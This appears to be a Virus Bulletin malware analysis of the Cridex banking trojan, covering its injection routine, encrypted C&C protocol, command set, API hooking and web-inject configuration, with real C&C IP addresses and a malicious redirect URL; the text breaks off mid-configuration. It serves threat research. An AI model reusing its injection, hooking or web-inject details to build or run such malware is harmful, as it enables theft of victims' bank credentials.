<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Cridex botnet preview</title>
<meta name="description" content="Carmen Liang and Neo Tan focus on a detailed analysis of the Cridex banking trojan's injection routine, communication protocol, encryption scheme and working mechanism in order to shed light on the development path of the three most recent generations of Cridex bots." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1973;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201210-Cridex"></a>Cridex botnet preview</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2012-10-10</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="surname">Carmen Liang</span></h3><span class="orgname">Fortinet</span>, <span class="orgdiv">Canada</span></div><div class="author titlepage"><h3 class="author"><span class="firstname">Neo</span> <span class="surname">Tan</span></h3><span class="orgname">Fortinet</span>, <span class="orgdiv">Canada</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>Carmen Liang and Neo Tan focus on a detailed analysis of the Cridex banking trojan&#39;s injection routine, communication protocol, encryption scheme and working mechanism in order to shed light on the development path of the three most recent generations of Cridex bots.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2012 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-3282" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-3282" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id3975339"></a></span></dt><dt><span class="sect1"><a href="#id3859689">Injection routine</a></span></dt><dt><span class="sect1"><a href="#id3290079">Communication protocol and encryption scheme</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id4230769">Gather local machine information</a></span></dt><dt><span class="sect2"><a href="#id4857899">Communication protocol</a></span></dt><dt><span class="sect2"><a href="#id2715731">Communication encryption scheme</a></span></dt><dt><span class="sect2"><a href="#id3995869">Communication data structure</a></span></dt><dt><span class="sect2"><a href="#id3100103">Command and control</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id4182010">Inline hook of current process API</a></span></dt><dt><span class="sect1"><a href="#id4525900">Conclusion</a></span></dt><dt><span class="sect1"><a href="#id4694678">Appendix</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3975339"></a></h2></div></div></div><p>Cridex is a trojan that steals bank account information from its victims. It is programmed in object oriented C++. The Cridex botnet is centralized, communicating with its C&amp;C server regularly to retrieve the latest configuration files and corresponding binary updates. Some generations use a combined cryptographic system consisting of public- and symmetric-key cryptography to secure communication between the bot and C&amp;C server. Today, there are four main generations of Cridex bots. The first, generation 0, was discovered around the end of 2011, and has no encryption at all. The three later generations have become more active over the last couple of months. In this article, we will focus on a detailed analysis of the Cridex injection routine, communication protocol, encryption scheme and working mechanism in order to shed light on the development path of the three recent generations of Cridex bots.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3859689"></a>Injection routine</h2></div></div></div><p>When the trojan launches, it first drops itself into the %App Data% folder and writes the name of the dropped file to the autorun registry entry (e.g. HKCU\Software\Microsoft\Windows\CurrentVersion\Run\KB%8d.exe). The filename starts with the letters &lsquo;KB&rsquo;, followed by an eight-digit number derived from the victim&rsquo;s volume serial number. The trojan will delete itself using a batch file once it has run from the dropped file.</p><p>Next, it checks the current OS environment and acts accordingly. If it is in a 64-bit environment, only the communication routine will be executed. Otherwise, it goes through a list of all the currently running processes, and injects itself into processes that have the right access and security identifier (SID). It then allocates a block of memory containing a copy of itself inside the targeted process. Then it uses CreateRemoteThread to run the malicious routine.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3290079"></a>Communication protocol and encryption scheme</h2></div></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4230769"></a>Gather local machine information</h3></div></div></div><p>Before the bot communicates with the C&amp;C server, it first gathers the basic information from the victim machine, including serial number, computer name, version information and a hash value of the user&rsquo;s security identity. All of this information will be sent to the C&amp;C server.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4857899"></a>Communication protocol</h3></div></div></div><p>The following is a partial list of C&amp;C server IPs and their corresponding geographic locations (<a href="#figure.1">Figure 1</a>).</p><div class="itemizedlist"><ul type="disc"><li><p>110.234.150.163</p></li><li><p>123.49.61.59</p></li><li><p>173.203.96.79</p></li><li><p>180.235.150.72</p></li><li><p>184.106.189.124</p></li><li><p>190.81.107.70</p></li><li><p>200.169.13.84</p></li><li><p>202.143.147.35</p></li><li><p>203.172.252.26</p></li><li><p>203.172.252.29</p></li><li><p>203.217.147.52</p></li><li><p>210.56.23.100</p></li><li><p>211.44.250.173</p></li><li><p>219.94.194.242</p></li><li><p>31.17.189.212</p></li><li><p>41.168.5.140</p></li><li><p>58.68.2.214</p></li><li><p>64.94.164.18</p></li><li><p>83.143.134.23</p></li><li><p>83.238.208.55</p></li><li><p>85.226.179.185</p></li><li><p>89.111.176.87</p></li><li><p>91.121.103.143</p></li><li><p>95.142.167.193</p></li><li><p>97.74.75.172</p></li></ul></div><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="C&amp;C server geographic locations." src="/uploads/images/figures/2012/10/Cridex-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;C&amp;C server geographic locations.</b></p></div><p>After gathering the information, the bot will try to communicate with one of the C&amp;C servers. The communication routine is injected into every process that the bot has the access rights to open. It has mutex and event checks to ensure that only one thread at a time executes the communication routine in order to avoid data sharing conflicts. Its primary goal is to retrieve the configuration file and binary updates from the C&amp;C server. The bot communicates with the server using both HTTP and a direct use of TCP. The direct use of TCP is solely to create a connection to the back server (which is different from the C&amp;C server), whose IP address is in the configuration file. Usually (in generations 1 and 2), after sending a plain-text message detailing the victim&rsquo;s system information, it just keeps the connection alive and waits for the back server&rsquo;s command. It also has the ability to archive, search and execute local files. The direct use of the TCP protocol is apparently the botmaster&rsquo;s last resort if the bot doesn&rsquo;t work as expected. This protocol is not designed to work on demand. If the bot pool grows in scale, the back server will eventually need to handle numerous &lsquo;KEEP ALIVE&rsquo; requests, which will be similar to launching a DDoS attack on the back server. <a href="#figure.2">Figure 2</a> shows the communication between the bot and the back server.</p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="Back connection" src="/uploads/images/figures/2012/10/Cridex-2-600.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;Back connection</b></p></div><p>(A larger verison of Figure 2 can be viewed <a href="/uploads/images/figures/2012/10/Cridex-2-large.jpg" target="_top">here</a>.)</p><p>The thread that uses the HTTP protocol is the main method the bot uses to communicate with the C&amp;C server to retrieve the configuration file and get binary updates.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2715731"></a>Communication encryption scheme</h3></div></div></div><p>The communication encryption scheme varies from generation to generation: both the first and second generation use a customized hybrid cryptographic system, but the third generation uses SSL encrypted communication. Since the second generation introduced an XML formatted configuration file, the data for this generation was encoded in Base64 (step 1 below). The customized cryptographic system is an encryption system which combines public-key cryptography (RSA) with symmetric-key cryptography (RC4), so that it has both the confidentiality of non-symmetric encryption and the efficiency of symmetric encryption. The following are the steps involved in the second generation encryption scheme:</p><div class="orderedlist"><ol type="1"><li><p>It uses CryptStringToBinaryA to decode the encrypted CERT_PUBLIC_KEY_INFO structure from base64 format to binary. In all variants, the base64 data is MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBi QKBgQCvR7x8oHW63g45dwL84Xyga4jdsEUyYc9taOLTZ+kEhwauB7UbvXliNZZsq1HzsNgz+Ge7j VT2nyBIvDwx6CozX0iNM2QG7ZalwB6zBVyvpg TNTQqE8ODZrDGIkabg4OT3YeRrux4Z8GZ14Jja /jITSQZBMvsWguP/wFpUJ35v2wIDAQAB.</p></li><li><p>Then it calls CryptDecodeObjectEx to decrypt the binary data using parameters dwCertEncodingType= X509_ASN_ENCODING and lpszStructType= X509_PUBLIC_KEY_INFO to obtain the decoded CERT_PUBLIC_KEY_INFO structure.</p></li><li><p>After using CryptImportPublicKeyInfo to import the public key, it calls CryptGenKey with parameter Algid=CALG_RC4 to generate a temporary RC4 key, which is the session key.</p></li><li><p>It uses CryptExportKey to export the session key with encryption using the public key from step 2. The parameter dwBlobType is set to SIMPLEBLOB, so the output of this call will be in the following format:</p><pre class="programlisting">struct SimpleBLOB {                 struct BLOBHEADER {

 BLOBHEADER  blobheaderStruc;        BYTE    bType;
 ALG_ID     algid;                   BYTE    bVersion;
 BYTE       encryptedKey[0x80];      WORD    reserved;
                                     ALG_ID  aiKeyAlg;
}                                  }</pre><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="BLOBHEADER and encrypted session key." src="/uploads/images/figures/2012/10/Cridex-3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;BLOBHEADER and encrypted session key.</b></p></div><p>&lsquo;SimpleBLOB&rsquo; in <a href="#figure.3">Figure 3</a> indicates that this is a SIMPLEBLOB, the session key is encrypted using an RSA public key, and the session key itself is an RC4 key. The RC4 key will be sent to the C&amp;C server because the server does not know what key is generated by the client and used to encrypt the message. And it can only be decrypted using the C&amp;C server&rsquo;s private key.</p></li><li><p>It then uses the RC4 key to encrypt the plain-text message with the following format:</p><pre class="programlisting">struct Message_Packet {
   DWORD    magicWORD;   //in this variant, it uses &ldquo;DEADBEEF&rdquo;
   DWORD    msgSize;     //the size of this whole message
   DWORD    keyExpFlag;  //if the RC4 key is exported successfully
   BYTE     encryptedKey[0x80];  //exported RC4 key, encrypted
   BYTE     sha1ofMsg[0x14];     //SHA1 value of the following encrypted message
   BYTE     encryptedMsg[msgLen];  //the message encrypted using RC4
}
</pre><p>It only copies the encryptedKey from the SimpleBLOB structure to form this message, stripping the BLOBHEADER and the algorithm ID. Therefore, the C&amp;C server assumes the encrypted key is an RC4 key exported in SimpleBLOB format, and that the algorithm will be RSA.</p></li></ol></div><p>(For more details of the encryption steps, please see the simulated pseudo code in the Appendix.)</p><p>The received packet structure is very similar to the struct Message_Packet described above, except the BYTE encryptedKey[0x80] field is substituted with BYTE signatureRecvMsg[0x80]. To decrypt the encryptedMsg, the bot simply calls CryptDecrypt using the same RC4 session key as is stored in the memory. In order to check for the integrity of the received message, the bot calls CryptVerifySignatureW with hPubKey set to the imported public key and the pbSignature pointing to the signature RecvMsg.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3995869"></a>Communication data structure</h3></div></div></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id3677174"></a>Send message data structure</h4></div></div></div><p>The message content is in &lsquo;plain text&rsquo;. The structure of these messages is very different across the three generations. The first data sent to the server has the following layout:</p><p><span class="bold"><strong>First generation </strong></span></p><p>The data is in binary format, the following is its pseudo struct code:</p><pre class="programlisting">struct first_sending_message {
  DWORD    size_of_message
  WORD     unknown marker
  DWORD    size_of_header
  DWORD    size_of_data
  WORD     unknown_marker
  WORD     service_pack_major_version
  WORD     service_pack_minor_version
  WORD     windows_major_version
  WORD     windows_minor_version
  BYTE     computer_architecture
  BYTE     null_end_marker
  DWORD    end_of_data_section
  DWORD    size_of_end_marker
  DWORD    end_of_message
  WORD     computer_name
  BYTE     5f_marker
  QWORD    volume_serial_number
  QWORD    register_name (the condensed USID)
}</pre><p><span class="bold"><strong>Second generation</strong></span></p><p>The following is an example of the message:</p><pre class="programlisting">&lt;message set_hash=&rdquo;&rdquo; req_set=&rdquo;1&rdquo; req_upd=&rdquo;1&rdquo;&gt;
     &lt;header&gt;
           &lt;unique&gt;HL_AC197B6886B8B695&lt;/unique&gt;
           &lt;version&gt;105&lt;/version&gt;
           &lt;system&gt;86320&lt;/system&gt;
           &lt;network&gt;nt&lt;/network&gt;
     &lt;/header&gt;
     &lt;data&gt;&lt;/data&gt;
&lt;/message&gt;</pre><p>We can see from this example that it uses XML format. &lsquo;req_set&rsquo; describes whether the initial set-up is successful. &lsquo;req_upd&rsquo; describes whether it is requesting an update. The &lsquo;unique&rsquo; tag contains basic computer information including computer name, volume serial number and register name. This makes up the unique ID for the victim&rsquo;s computer. The &lsquo;version&rsquo; tag contains the system version value. The &lsquo;system&rsquo; tag contains a structure describing the system information, which is a little redundant alongside the &lsquo;version&rsquo; tag. For example, 86320 in hex is 0x15130, and each byte indicates a specification of the current OS. The first &lsquo;1&rsquo; means the system is a VER_NT_WORKSTATION; &lsquo;5&rsquo; is the MajorVersion; &lsquo;1&rsquo; is the MinorVersion; &lsquo;3&rsquo; is the ServicePackMajor; &lsquo;0&rsquo; is the ServicePackMinor. The &lsquo;data&rsquo; tag contains the stolen information.</p><p><span class="bold"><strong>Third generation</strong></span></p><p>The structure of the packet changed the most in this generation. It contains some garbage data (the sums) in the middle of the packets. The most important tags, &lsquo;unique&rsquo; and &lsquo;data&rsquo;, are still the same as in the second generation. It also contains the injected process filename. </p><pre class="programlisting">struct message_packet {
   DWORD    magicWord;  //new magic word &ldquo;85 04 08 FF&rdquo;
   DWORD    packetSize;
   DWORD    reqSet;
   DWORD    reqUpd;
   DWORD    sytemTimeStamp;
   DWORD    botVer;  //bot version
   DWORD    verBuildNum;
   WORD     spMajorVer;
   WORD     spMinorVer;
   DWORD    offsetToUnique;
   DWORD    uniqueSize;
   DWORD    sum1;  //sum of the above 2 DWORDs
   DWORD    fileNameSize;  //installer file name
   DWORD    sum2;  //sum of the above 2 DWORDs
   DWORD    dataSize;
   DWORD    sum3;  //sum of the above 2 DWORDs
   BYTE     unique[uniqueSize];
   BYTE     fileName[fileNameSize];  //injected process filename
   BYTE     data[dataSize];
}</pre></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id2977624"></a>Received message data structure</h4></div></div></div><p>The data structure of the received messages is not only different across generations, but also different from the structure of the sending messages.</p><p><span class="bold"><strong>First generation</strong></span></p><p>The messages are in binary format. The message is composed in a huge section, which is labelled &lsquo;0x0A&rsquo; and later will be divided into many sections and subsections. All sections and subsections can be generalized into the following data structure: </p><pre class="programlisting">struct general_section_layout{
     DWORD size_of_section
     DWORD label_id
     BYTE  section_content [size_of_section_8]
}
</pre><p>Inside this huge section there are generally four types of sections. These are labelled &lsquo;0x80&rsquo;, &lsquo;0x82&rsquo;, &lsquo;0x83&rsquo; and &lsquo;0x84&rsquo; in the label_id area. Most of the injected HTML code is in label_83. The details of the structure of the sections are as follows:</p><pre class="programlisting">struct label_80 {
    DWORD size_of_section
    DWORD label_id
    BYTE  section_content [size_of_section_8] (URL, start with &lsquo;*&rsquo; and end with &lsquo;* &lsquo;)
}

struct label_82 {
    DWORD size_of_section
    DWORD label_id
    BYTE  section_content [size_of_section_8]
          (pattern, start with &lsquo;*&rsquo; and end with &lsquo;* &lsquo;; redirect, content marked after &lsquo;* &lsquo;)
}

struct label_84 {
    DWORD size_of_section
    DWORD label_id
    BYTE  ip_addresses [size_of_section_8]
}

struct label_83 {
    DWORD size_of_section
    DWORD label_id
    DWORD end_of_section_header
    DWORD zero_marker
    DWORD url_length
    BYTE  URL (start with &lsquo;*&rsquo; and end with &lsquo;* &lsquo;) [url_length]
    DWORD size_of_subsection_1
    DWORD 1st_zero_delimiter_offset
    DWORD 2nd _zero_delimiter_offset
    DWORD 3rd _zero_delimiter_offset
    BYTE  subsection (html code) [size_of_subsection_1}
    DWORD size_of_subsection_2
    DWORD 1st_zero_delimiter_offset
    DWORD 2nd _zero_delimiter_offset
    DWORD 3rd _zero_delimiter_offset
    BYTE  subsection (html code) [size_of_subsection_2]
    DWORD size_of_subsection_3
          ...(continue until section ends)
}</pre><div class="itemizedlist"><ul type="disc"><li><p>label_80 parses the URLs of the targeted sites and stores them in a table in the .data section of the current process.</p><div class="itemizedlist"><ul type="circle"><li><p>There is a maximum of 200 entries.</p></li></ul></div></li><li><p>label_82 parses &lsquo;jqueryaddonsv2\.js&rsquo; and &lsquo;http://***/cp.php&amp;rsquo; and stores the result in the .data section of the current process.</p></li><li><p>label_83 hashes the HTML code respectively into the .data section of the current process.</p><div class="itemizedlist"><ul type="circle"><li><p>There is a maximum of 100 entries. Each entry represents a section of the HTML code that is targeted to a specific site. Each section can have up to three subsections.</p></li></ul></div></li><li><p>label_84 stores the IP address to the .data section of the current process.</p></li></ul></div><p><span class="bold"><strong>Second generation</strong></span></p><p>This generation uses XML format. It mainly has two big branches, which are &lt;settings&gt; and &lt;commands&gt;. The content in the &lt;settings&gt; branch shares some similarities with the content of the first generation. There are five sub-branches under the &lt;settings&gt; branch, which are &lt;httpshots&gt;, &lt; formgrabber&gt;, &lt;redirects&gt;, &lt;bconnect&gt; and &lt;httpinjects&gt;. The content in &lt;httpshots&gt; is similar to the URL of label_80. The content in &lt;redirects&gt; is similar to the content of label_82. Interestingly, the IP addresses for &lt;bconnect&gt; and label_84 are exactly the same: 31.184.192.195:443. The second generation has introduced the &lt;formgrabber&gt; functionality, targeting only www.facebook.com for the time being. There are eight types of commands under the &lt;command&gt; branch. Each type is associated with a set of corresponding instructions in the injected code. <a href="#figure.4">Figure 4</a> shows the XML structure of the received message.</p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="XML structure of the configuration file." src="/uploads/images/figures/2012/10/Cridex-4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;XML structure of the configuration file.</b></p></div><p><span class="bold"><strong>Third generation </strong></span></p><p>The third generation uses a new magic word, &lsquo;85 04 08 FF&rsquo;, instead of &lsquo;DEADBEEF&rsquo; which was used by the previous two generations. It abandons the XML structure, instead returning to the binary structure with labels as seen in the first generation. However, the label values have changed to integer numbers between 0 and 5.</p></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3100103"></a>Command and control</h3></div></div></div><p>In all generations there is a special thread that is dedicated to handling the commands that are stored in the registry. Since the structure of these commands is different, the methods of handling them must be different.</p><p><span class="bold"><strong>First generation</strong></span></p><div class="itemizedlist"><ul type="disc"><li><p>Type_1 &ndash; downloads file from a URL and runs it</p></li><li><p>Type_2 &ndash; writes a log file</p></li><li><p>Type_3 &ndash; creates a CAB file</p></li><li><p>Type_4 &ndash; creates an auto-reset event</p></li><li><p>Type_5 &ndash; deletes cookies.</p></li></ul></div><p><span class="bold"><strong>Second generation</strong></span></p><div class="itemizedlist"><ul type="disc"><li><p>Type_1 &ndash; stores update file obtained from the configuration file in %TMP% as a four-character temporary file and runs it</p></li><li><p>Type_2 &ndash; downloads file from a URL and runs it</p></li><li><p>Type_3&amp;4 &ndash; writes log file</p></li><li><p>Type_5 &ndash; creates cookies CAB file then deletes cookies</p></li><li><p>Type_6 &ndash; deletes cookies</p></li><li><p>Type_7 &ndash; creates an auto-reset event</p></li><li><p>Type_8 &ndash; gets current system time and private key and stores them in the log file.</p></li></ul></div><p><span class="bold"><strong>Third generation</strong></span></p><div class="itemizedlist"><ul type="disc"><li><p>Type_1 &ndash; stores update file obtained from the configuration file in %TMP% as a four-character temporary file and runs it</p></li><li><p>Type_2&amp;3 &ndash; downloads file from a URL and runs it</p></li><li><p>Type_4 &ndash; writes log file</p></li><li><p>Type_5 &ndash; deletes <span class="emphasis"><em>Firefox</em></span> cookies</p></li><li><p>Type_6 &ndash; deletes <span class="emphasis"><em>Flash</em></span> cookies</p></li><li><p>Type_7 &ndash; creates CAB file</p></li><li><p>Type_8 &ndash; gets current system time and private key and stores them in the log file</p></li><li><p>Type_9 &ndash; creates event.</p></li></ul></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4182010"></a>Inline hook of current process API</h2></div></div></div><p>The hooking technique the bot uses is called inline hooking. The idea is to redirect the call flow to the malicious routine at the entry point of the hooked API. For example, in <a href="#figure.5">Figure 5</a>, this is in the memory of the nspr4.dll module of the firefox.exe process. It replaces the API&rsquo;s entry code 8b 44 24 04 8b with e9 3b 56 32 ff, so the call to PR_Connect will be redirected to the malicious subroutine 0x15D830, inside which there is a dummy subroutine at 0x151010. The dummy subroutine is initially formed by a series of NOPs (0x90). During the hooking process, the overwritten codes are saved to the dummy subroutine at 0x151010. An unconditional jump is also written to lead the execution flow back to the original API. The bot has the algorithm to calculate where the assembly operation line ends, so it can save the entire line of operation, 8b 08, to make sure it will not jump back to the middle of an operation. In <a href="#figure.5">Figure 5</a>, it jumps back to 0xE381F6, not 0xE381F5, right after the unconditional jump.</p><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="Inline hooking of nspr4.PR_Connect." src="/uploads/images/figures/2012/10/Cridex-5.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;Inline hooking of nspr4.PR_Connect.</b></p></div><p>The bot checks the process it injects into and hooks the corresponding API accordingly.</p><p>For all processes, it tries to hook the following APIs:</p><div class="itemizedlist"><ul type="disc"><li><p>ntdll.NtResumeThread</p></li><li><p>ntdll.LdrLoadDll</p></li><li><p>Secur32.DeleteSecurityContext</p></li><li><p>Secur32.InitializeSecurityContextW</p></li><li><p>Secur32.InitializeSecurityContextA</p></li><li><p>Secur32.EncryptMessage</p></li><li><p>Secur32.DecryptMessage</p></li></ul></div><p>If the process imports ws2_32.dll and crypt32.dll (e.g. explorer.exe and iexplorer.exe), it hooks the following APIs as well:</p><div class="itemizedlist"><ul type="disc"><li><p>ws2_32.connect</p></li><li><p>ws2_32.send</p></li><li><p>ws2_32.WSASend</p></li><li><p>ws2_32.recv</p></li><li><p>ws2_32.WSARecv</p></li><li><p>ws2_32.select</p></li><li><p>ws2_32.closesocket</p></li><li><p>ws2_32.getaddrinfo</p></li><li><p>ws2_32.gethostbyname</p></li><li><p>crypt32.PFXImportCertStore</p></li></ul></div><p>While if the process is firefox.exe, it hooks the following APIs:</p><div class="itemizedlist"><ul type="disc"><li><p>nspr4.PR_Connect</p></li><li><p>nspr4.PR_Write</p></li><li><p>nspr4.PR_Read</p></li><li><p>nspr4.PR_Poll</p></li><li><p>nspr4.PR_Close</p></li><li><p>ssl3.ImportFD</p></li></ul></div><p>By hooking these APIs, the bot has the ability to mask the URLs received in the browsers and perform a few tasks according to the configuration file. If the URL contains the domain name in the &lt;httpshots&gt; tag or the &lt;formgrabber&gt; tag (e.g. xxxbank.com), the bot will try to match the pattern in the &lt;conditions&gt; tag (e.g. *xxxbank.com.*). If the condition matches, it will inject the HTTP code from the &lt;replacement&gt; tag. With those encryption APIs hooked, it can bypass the site&rsquo;s traffic encryption protocol such as SSLv3. In this variant the code in the &lt;replacement&gt; tags is all the same:</p><pre class="programlisting">&lt;replacement&gt;
     &lt;![CDATA[&lt;script type=&rdquo;text/javascript&rdquo; src=&rdquo;https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js&rdquo;&gt;;
     &lt;/script&gt;
     &lt;script type=&rdquo;text/javascript&rdquo; src=&rdquo;/jqueryaddonsv2.js&rdquo;&gt;
     &lt;/script&gt;   ]]&gt;
&lt;/replacement&gt;
</pre><p>By injecting this code into the page, it triggers a hooking function which redirects any URL matching the pattern &lsquo;.*jqueryaddonsv2\.js.*&rsquo; to a malicious JavaScript page: http://69.64.56.232:8080/za/v_01_a/in/cp.php, according to the configuration:</p><pre class="programlisting">&lt;redirect&gt;
     &lt;pattern&gt;.*jqueryaddonsv2\.js.*&lt;/pattern&gt;
     &lt;process&gt;http://69.64.56.232:8080/za/v_01_a/in/cp.php&lt;/process&gt;;
